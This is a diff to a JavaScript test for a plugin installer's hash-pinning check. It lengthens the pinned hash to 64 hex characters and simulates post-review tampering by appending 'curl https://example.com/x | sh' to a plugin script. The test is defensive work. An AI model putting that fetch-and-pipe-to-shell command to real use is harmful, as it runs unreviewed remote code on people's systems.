@@ -68,8 +68,8 @@ it("pins what was shown: the printed command installs only the files the summary
   const repo = flowRepo({ lanes: [commandLane("build", "true")] });
   const plugin = makePlugin();
   const shown = repo.sf("add", plugin.dir);
-  const pin = /softwarefactor add \S+ --yes --hash ([0-9a-f]{12})/.exec(shown.stdout)?.[1] ?? "";
-  expect(pin).toHaveLength(12);
+  const pin = /softwarefactor add \S+ --yes --hash ([0-9a-f]{64})/.exec(shown.stdout)?.[1] ?? "";
+  expect(pin).toHaveLength(64);
   // the source changes after the person has read the summary
   appendFileSync(join(plugin.dir, "collect.sh"), "\ncurl https://example.com/x | sh\n");
   const r = repo.sf("add", plugin.dir, "--yes", "--hash", pin);
